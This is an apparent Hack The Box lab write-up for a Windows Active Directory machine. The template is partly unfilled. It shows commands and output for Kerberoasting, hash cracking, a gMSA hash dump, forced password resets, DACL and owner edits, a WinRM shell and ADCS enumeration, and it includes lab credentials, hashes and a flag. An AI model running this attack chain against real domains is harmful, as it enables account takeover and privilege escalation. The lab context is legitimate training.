
| Property         | Value                    |
| ---------------- | ------------------------ |
| **OS**           | Windows                  |
| **Difficulty**   | Medium                   |
| **Release Date** | 7th June, 2025           |
| **State**        | YYYY-MM-DD               |
| **IP**           | 10.10.10.X               |
| **Techniques**   | technique-1, technique-2 |
| **Tags**         | #web #privesc #linux     |

---
## Summary

Brief 2-3 sentence ogverview of the machine and attack path.

---
## Enumeration

### Nmap Scan

```
nmap -sC -sV tombwatcher.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-24 03:23 EDT
Nmap scan report for tombwatcher.htb (10.129.144.23)
Host is up (0.053s latency).
Not shown: 987 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-24 11:23:41Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-09-24T11:25:03+00:00; +4h00m02s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-09-24T11:25:02+00:00; +4h00m01s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-09-24T11:25:03+00:00; +4h00m02s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-09-24T11:25:02+00:00; +4h00m01s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-09-24T11:24:23
|_  start_date: N/A
|_clock-skew: mean: 4h00m01s, deviation: 0s, median: 4h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 93.40 seconds
                                                                
```

```
 nmap -p- tombwatcher.htb --open
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-24 03:23 EDT
Nmap scan report for tombwatcher.htb (10.129.144.23)
Host is up (0.051s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49695/tcp open  unknown
49696/tcp open  unknown
49698/tcp open  unknown
49716/tcp open  unknown
49727/tcp open  unknown
53575/tcp open  unknown

Nmap done: 1 IP address (1 host up) sc
```

### SMB Enumeration

```
nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --shares

SMB         10.129.144.23   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.144.23   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.144.23   445    DC01             [*] Enumerated shares
SMB         10.129.144.23   445    DC01             Share           Permissions     Remark
SMB         10.129.144.23   445    DC01             -----           -----------     ------
SMB         10.129.144.23   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.144.23   445    DC01             C$                              Default share
SMB         10.129.144.23   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.144.23   445    DC01             NETLOGON        READ            Logon server share 
SMB         10.129.144.23   445    DC01             SYSVOL          READ            Logon server share 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/tombwatcher]
└─$ 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/tombwatcher]
└─$ nxc smb tombwatcher.htb -u henry -p 'H3nry_987TGV!' --users 
SMB         10.129.144.23   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False) 
SMB         10.129.144.23   445    DC01             [+] tombwatcher.htb\henry:H3nry_987TGV! 
SMB         10.129.144.23   445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.129.144.23   445    DC01             Administrator                 2025-04-25 14:56:03 0       Built-in account for administering the computer/domain 
SMB         10.129.144.23   445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.129.144.23   445    DC01             krbtgt                        2024-11-16 00:02:28 0       Key Distribution Center Service Account 
SMB         10.129.144.23   445    DC01             Henry                         2025-05-12 15:17:03 0        
SMB         10.129.144.23   445    DC01             Alfred                        2025-05-12 15:17:03 0        
SMB         10.129.144.23   445    DC01             sam                           2025-05-12 15:17:03 0        
SMB         10.129.144.23   445    DC01             john                          2025-05-19 13:25:10 0        
SMB         10.129.144.23   445    DC01             [*] Enumerated 7 local users: TOMBWATCHER

```

## BloodHound enumeration

```
sudo bloodhound-python -u henry -p 'H3nry_987TGV!' -ns 10.129.144.23 -d tombwatcher.htb -c all --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::522b:13ff:a3a4:845f
INFO: Trying LDAP connection to dead:beef::522b:13ff:a3a4:845f
INFO: Testing resolved hostname connectivity dead:beef::127
INFO: Trying LDAP connection to dead:beef::127
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Testing resolved hostname connectivity dead:beef::522b:13ff:a3a4:845f
INFO: Trying LDAP connection to dead:beef::522b:13ff:a3a4:845f
INFO: Testing resolved hostname connectivity dead:beef::127
INFO: Trying LDAP connection to dead:beef::127
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
INFO: Done in 00M 15S
INFO: Compressing output into 20260924033424_bloodhound.zip

```

---
## Lateral movement from herny to alfred

![(./screens/1.png)

### targeted kerberoast

Description of the vulnerability exploited.

### Exploitation

Step-by-step exploitation with commands.

```shell
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[!] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
Traceback (most recent call last):
  File "/home/kali/tools/targetedKerberoast/targetedKerberoast.py", line 597, in main
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(clientName=userName, password=args.auth_password, domain=args.auth_domain, lmhash=None, nthash=auth_nt_hash,
                                             ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                                            aesKey=args.auth_aes_key, kdcHost=args.dc_ip)
                                                            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 323, in getKerberosTGT
    tgt = sendReceive(encoder.encode(asReq), domain, kdcHost)
  File "/usr/lib/python3/dist-packages/impacket/krb5/kerberosv5.py", line 93, in sendReceive
    raise krbError
impacket.krb5.kerberosv5.KerberosError: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
                                                                                                                    
┌──(kali㉿kali)-[~/tools/targetedKerberoast]
└─$ sudo ntpdate tombwatcher.htb
[sudo] password for kali: 
2026-09-24 07:52:50.481026 (-0400) +14400.376862 +/- 0.022918 tombwatcher.htb 10.129.144.23 s1 no-leap
CLOCK: time stepped by 14400.376862
                                                                                                                    
┌──(kali㉿kali)-[~/tools/targetedKerberoast]
└─$ python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$bfb3189a3daf3e1c3ea05b2b6f8a47ca$1decb5a4a107e8fc3c349f302ae17388a50cbdc4ecf4e99fb5cf48b5eccfe59f8d1e238ea3cd51d9df1c7a57fcb56fcbab697f0e33afef58217e617c81df10dd4036c3246026c6e01bd6696aa14595d4030ee0994dec5cb78acfbe0da923eb203a6dd09b4307705cff3e11dc8acb91b33aa8bcd57451e374a203038ae01aab7b5188af4e9b26e6abbd98dfd9c0ac960140250c6de273e596e6add5f2b2624bd2aae73b95de6d2f27ff1d6ffdfc6057bbe4169e490e264723f175f8ad05e8fac03253b6bcc6780c9eb1c26b25142a842d7ce8fd432222b14f267c0c899b148c651cf2e43ecc671c52e398b34af275f6c943b375ff10e316c6e25386b5333a51d86379b99c6f1b7eda4e0f90a793be1a24d982868a7fd571e2d974cd32ef8c7fb5076b1aa009bc198a52c97bdd9624ca59df789fbbfa5360f9f6c95a7270a26d385019c9017dbe479d38cc38e45ccc5bc89fe5ff57c30e949d48aeeb91944df54cb07ee2df01f53e90d6f8dca57cde899e34b4671fc14a7c5a14fda57b52c3e328d6442fb910594550988d4f462ca9a331d5813afbc5aec5005341fa6f2b4791ae8b2989a3f6c9868086c83e24d2f2361d0c3d78b0819da2b4054153fa845997c4f13e8bab6e0a445b3a50394b285475c7dabe9ec30b66b13329ec9701851c2bc811fdfc9c400c57f6980f2841323c47bffd061c7a1eba81a628ed2218fbf9134f1309b87077ea0c1fb1724348dff56b2625819543cef8ebf753c6b10be90bff518714135cb1200fc8d0590b0f2afa84f96affc5791be469f6830eef35c619dc1a0fa10774a23de41265262747d0f7cc74bae2e7ecf86d112c83dd082b5b54de3f30d118567112cb2d4a6a0050e0750c64c3c10cef0719118f9fb697fde5cdeaf9b1c0490c66560ce69fe6450854c71ef70453976559e46de6a451aaf75e822007c70cee7b78646da6c5b5387bb17504245032a06066542fa1c8c5092d7b14a81c3cb547e23858b41ebf499750a92c3ad84ee502aea8967dbab4e57e91faf6de511e7fd227dd885f8d579b0f303935200c7936cae6788d48741a5ba5e7ff3d8d86e8a72a8f11af2c871173a58494442a1a6070ee985dc96dc8b811121a6d40ba1ffdffe4e88771aa62841e43595b312aae0d050479b9ff8b9360441c076a3f08cb6aef5ada07b96e525196303797aa71bc7e6b898ed4e701ea3e4918f6012a8d425847b261fba060a486fa93236323c81f738191a85deda9d31a12f4125d291b00e0331ab82cc75994c59cfd6da6176a695722f02562aea36ffdd956961c69200e380c9deb2aefa338a6af1fd5aebe09d4b9b7760de634934d1eafb167ead277d0f71e84d661a6fc3e5ddfd544b04cb954594565ef4375b2ac3a4b986ed00434b3009626f238c610a21590ea43f3a2d0bec6174f6a535ef43e47ca4a84eacf99e13916cec7ce354c28651bc21494deba95c7beb2023c
[VERBOSE] SPN removed successfully for (Alfred)

```

recovered creds:

```
hashcat -m 13100 alfred.hash /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-Intel(R) Core(TM) i5-10310U CPU @ 1.70GHz, 1469/2939 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 512 MB (968 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$bfb3189a3daf3e1c3ea05b2b6f8a47ca$1decb5a4a107e8fc3c349f302ae17388a50cbdc4ecf4e99fb5cf48b5eccfe59f8d1e238ea3cd51d9df1c7a57fcb56fcbab697f0e33afef58217e617c81df10dd4036c3246026c6e01bd6696aa14595d4030ee0994dec5cb78acfbe0da923eb203a6dd09b4307705cff3e11dc8acb91b33aa8bcd57451e374a203038ae01aab7b5188af4e9b26e6abbd98dfd9c0ac960140250c6de273e596e6add5f2b2624bd2aae73b95de6d2f27ff1d6ffdfc6057bbe4169e490e264723f175f8ad05e8fac03253b6bcc6780c9eb1c26b25142a842d7ce8fd432222b14f267c0c899b148c651cf2e43ecc671c52e398b34af275f6c943b375ff10e316c6e25386b5333a51d86379b99c6f1b7eda4e0f90a793be1a24d982868a7fd571e2d974cd32ef8c7fb5076b1aa009bc198a52c97bdd9624ca59df789fbbfa5360f9f6c95a7270a26d385019c9017dbe479d38cc38e45ccc5bc89fe5ff57c30e949d48aeeb91944df54cb07ee2df01f53e90d6f8dca57cde899e34b4671fc14a7c5a14fda57b52c3e328d6442fb910594550988d4f462ca9a331d5813afbc5aec5005341fa6f2b4791ae8b2989a3f6c9868086c83e24d2f2361d0c3d78b0819da2b4054153fa845997c4f13e8bab6e0a445b3a50394b285475c7dabe9ec30b66b13329ec9701851c2bc811fdfc9c400c57f6980f2841323c47bffd061c7a1eba81a628ed2218fbf9134f1309b87077ea0c1fb1724348dff56b2625819543cef8ebf753c6b10be90bff518714135cb1200fc8d0590b0f2afa84f96affc5791be469f6830eef35c619dc1a0fa10774a23de41265262747d0f7cc74bae2e7ecf86d112c83dd082b5b54de3f30d118567112cb2d4a6a0050e0750c64c3c10cef0719118f9fb697fde5cdeaf9b1c0490c66560ce69fe6450854c71ef70453976559e46de6a451aaf75e822007c70cee7b78646da6c5b5387bb17504245032a06066542fa1c8c5092d7b14a81c3cb547e23858b41ebf499750a92c3ad84ee502aea8967dbab4e57e91faf6de511e7fd227dd885f8d579b0f303935200c7936cae6788d48741a5ba5e7ff3d8d86e8a72a8f11af2c871173a58494442a1a6070ee985dc96dc8b811121a6d40ba1ffdffe4e88771aa62841e43595b312aae0d050479b9ff8b9360441c076a3f08cb6aef5ada07b96e525196303797aa71bc7e6b898ed4e701ea3e4918f6012a8d425847b261fba060a486fa93236323c81f738191a85deda9d31a12f4125d291b00e0331ab82cc75994c59cfd6da6176a695722f02562aea36ffdd956961c69200e380c9deb2aefa338a6af1fd5aebe09d4b9b7760de634934d1eafb167ead277d0f71e84d661a6fc3e5ddfd544b04cb954594565ef4375b2ac3a4b986ed00434b3009626f238c610a21590ea43f3a2d0bec6174f6a535ef43e47ca4a84eacf99e13916cec7ce354c28651bc21494deba95c7beb2023c:basketball
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb...b2023c
Time.Started.....: Thu Sep 24 03:57:18 2026 (0 secs)
Time.Estimated...: Thu Sep 24 03:57:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:    17362 H/s (4.28ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 2048/14344385 (0.01%)
Rejected.........: 0/2048 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 123456 -> lovers1
Hardware.Mon.#01.: Util: 51%

Started: Thu Sep 24 03:57:14 2026
Stopped: Thu Sep 24 03:57:20 2026
                                                          
```

`alfred:basketball`

 adding alfred to infrastructure group:

```
 bloodyad --host DC01.tombwatcher.htb -d tombwatcher.htb -u alfred -p basketball add groupMember INFRASTRUCTURE alfred                
[+] alfred added to INFRASTRUCTURE
```

---
### Lateral Movement from alfred to ansible_dev$

reading gmsa NT hash of ansible_dev$ after inheriting the privileges of the group:

```
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'             
Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::3eca34dd13a85db79c03178b7b149621
ansible_dev$:aes256-cts-hmac-sha1-96:e9e2850abbdbd04b6f09aa9dea6ab0504a9e4e4f98435bc987f1f90d0faaca81
ansible_dev$:aes128-cts-hmac-sha1-96:f1e40e3681fdae0d4a8eaf0984691157
```

### Lateral movement from ansible_dev$ to sam 

ForcePasswordReset ACL is used to create a new password without knowing the previous:

```
pth-net rpc password "sam" 'newP@ssword2022' -U "tombwatcher.htb"/"ansible_dev$"%"ffffffffffffffffffffffffffffffff":"3eca34dd13a85db79c03178b7b149621" -S DC01.tombwatcher.htb
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

### Lateral movement from sam to john

Adding ownership to the john object
```
impacket-owneredit -action write -new-owner sam -target john tombwatcher.htb/sam:'newP@ssword2022' -dc-ip 10.129.144.23                   
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!

```

Setting GenericAll ACL over the john object, and resetting his password:
```
impacket-dacledit -action write -rights FullControl -principal sam -target john tombwatcher.htb/sam:'newP@ssword2022' -dc-ip 10.129.144.23
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260924-044909.bak
[*] DACL modified successfully!
                                                                                                                    
┌──(kali㉿kali)-[~/machines/tombwatcher]
└─$ net rpc password "john" "newP@ssword2022" -U "tombwatcher.htb"/"sam"%"newP@ssword2022" -S 10.129.144.23
                                                                                                                    
┌──(kali㉿kali)-[~/machines/tombwatcher]
└─$ 

```

### User flag

john is member of the remote management use
```
 evil-winrm -i tombwatcher.htb -u john -p 'newP@ssword2022'   
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\john\Documents> dir
*Evil-WinRM* PS C:\Users\john\Documents> tree \ .
Too many parameters - .
*Evil-WinRM* PS C:\Users\john\Documents> cd ,,
At line:1 char:4
+ cd ,,
+    ~
Missing argument in parameter list.

At line:1 char:5
+ cd ,,
+     ~
Missing argument in parameter list.
    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
    + FullyQualifiedErrorId : MissingArgument,Microsoft.PowerShell.Commands.InvokeExpressionCommand
*Evil-WinRM* PS C:\Users\john\Documents> cd ..
*Evil-WinRM* PS C:\Users\john> tree
Folder PATH listing
Volume serial number is EFB6-9D96
C:.
ÃÄÄÄDesktop
ÃÄÄÄDocuments
ÃÄÄÄDownloads
ÃÄÄÄFavorites
ÃÄÄÄLinks
ÃÄÄÄMusic
ÃÄÄÄPictures
ÃÄÄÄSaved Games
ÀÄÄÄVideos
*Evil-WinRM* PS C:\Users\john> cd Desktop
*Evil-WinRM* PS C:\Users\john\Desktop> dir


    Directory: C:\Users\john\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        9/24/2026   7:21 AM             34 user.txt


*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
b3438e9f759311d129b2b03ecaaa313f
*Evil-WinRM* PS C:\Users\john\Desktop> 



```

---
## Privilege Escalation

### Enumeration

```
 netexec ldap 10.129.144.23 -u john -p 'newP@ssword2022' --query "(ou=ADCS)" ""
LDAP        10.129.144.23   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:tombwatcher.htb)
LDAP        10.129.144.23   389    DC01             [+] tombwatcher.htb\john:newP@ssword2022 
LDAP        10.129.144.23   389    DC01             [+] Response for object: OU=ADCS,DC=tombwatcher,DC=htb
LDAP        10.129.144.23   389    DC01             objectClass          top
LDAP        10.129.144.23   389    DC01                                  organizationalUnit
LDAP        10.129.144.23   389    DC01             ou                   ADCS
LDAP        10.129.144.23   389    DC01             distinguishedName    OU=ADCS,DC=tombwatcher,DC=htb
LDAP        10.129.144.23   389    DC01             instanceType         4
LDAP        10.129.144.23   389    DC01             whenCreated          20241116005559.0Z
LDAP        10.129.144.23   389    DC01             whenChanged          20241116005605.0Z
LDAP        10.129.144.23   389    DC01             uSNCreated           12839
LDAP        10.129.144.23   389    DC01             uSNChanged           12856
LDAP        10.129.144.23   389    DC01             name                 ADCS
LDAP        10.129.144.23   389    DC01             objectGUID           4bcc54be-f3f7-6940-9085-18d905ff7a31
LDAP        10.129.144.23   389    DC01             objectCategory       CN=Organizational-Unit,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
LDAP        10.129.144.23   389    DC01             dSCorePropagationData 20241116170710.0Z
LDAP        10.129.144.23   389    DC01                                  20241116170708.0Z
LDAP        10.129.144.23   389    DC01                                  20241116170705.0Z
LDAP        10.129.144.23   389    DC01                                  20241116170418.0Z
LDAP        10.129.144.23   389    DC01                                  16010101000000.0Z
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/tombwatcher]
└─$ impacket-dacledit -action write -rights FullControl -inheritance \
  -principal 'john' -target-dn 'OU=ADCS,DC=tombwatcher,DC=htb' \
  'tombwatcher.htb/john:newP@ssword2022' -dc-ip 10.129.144.23
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
/usr/share/doc/python3-impacket/examples/dacledit.py:390: DeprecationWarning: codecs.open() is deprecated. Use open() instead.
  with codecs.open(self.filename, 'w', 'utf-8') as outfile:
[*] DACL backed up to dacledit-20260924-071602.bak
[*] DACL modified successfully!

```

```
certipy-ad find -u john -p 'newP@ssword2022' -dc-ip 10.129.144.23 -vulnerable -stdout                                  
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates                   : [!] Could not find any certificate templates
                                            
```

```
certipy-ad find -u john -p 'newP@ssword2022' -dc-ip 10.129.144.23 -stdout -enabled
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : KerberosAuthentication
    Display Name                        : Kerberos Authentication
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDomainDns
                                          SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Client Authentication
                                          Server Authentication
                                          Smart Card Logon
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T00:57:49+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Enterprise Read-only Domain Controllers
                                          TOMBWATCHER.HTB\Domain Admins
